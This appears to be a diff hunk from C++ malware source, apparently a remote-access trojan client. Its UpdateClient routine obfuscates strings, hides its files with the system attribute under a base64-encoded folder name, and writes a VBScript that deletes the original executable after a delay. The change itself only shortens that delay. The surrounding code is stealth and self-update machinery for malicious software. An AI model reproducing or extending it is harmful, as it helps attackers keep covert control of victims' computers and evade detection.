@@ -138,7 +138,7 @@ bool UpdateClient(SOCKET Sock)
 	if (NewClient.j["System"])
 		su.NoOutputCMD((string)AY_OBFUSCATE("attrib +s \"") + MFP + "VXBkYXRl\\" + MF + "\"");
 
-	UpdateVBS += "WScript.Sleep 2500\n";
+	UpdateVBS += "WScript.Sleep 1500\n";
 	UpdateVBS += "Set filesys = CreateObject(\"Scripting.FileSystemObject\")\n";
 	UpdateVBS += "Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n";
 	UpdateVBS += "filesys.DeleteFile \"" + FMFP + "\"\n";
